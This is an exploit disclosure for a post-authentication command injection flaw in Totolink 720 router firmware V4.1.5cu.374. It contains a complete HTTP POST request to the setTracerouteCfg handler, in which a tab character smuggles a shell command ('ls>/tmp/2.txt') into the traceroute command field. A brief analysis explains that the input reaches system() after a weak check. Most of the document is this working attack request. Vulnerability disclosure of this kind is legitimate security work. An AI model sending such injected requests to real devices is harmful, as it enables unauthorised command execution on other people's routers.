<b>Exploit Title:</b>Totolink 720 has a code execution vulnerability   
<b>Version:</b>V4.1.5cu.374  
<b>Date:</b>2022/08/16  
<b>Exploit Author:</b>xiaohu816  
<b>Vendor Homepage:</b>https://www.totolink.net/  

<b>POC:</b>  
After the administrator logs in, enter the "system tools" - > "route tracking" page to execute the command  
Execute TLS > / TMP / 2.txt  
  
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 58
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/traceroute.html?time=1659892330160
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID=2:1591951611:2
Connection: close

{"command":"aaaa\tls>/tmp/2.txt","num":"4","topicurl":"setTracerouteCfg"} 
```

<b>Analysis Report:</b>   
In the processing function of setting the routing parameters of the router, the input IP address is simply checked and then written into V6 through sprintf, and then the system is called for execution    
![image](https://user-images.githubusercontent.com/111302002/184791610-839f2172-38a1-47d8-9681-4ce5efff5d73.png)  
You can bypass the check by \ t to realize command injection
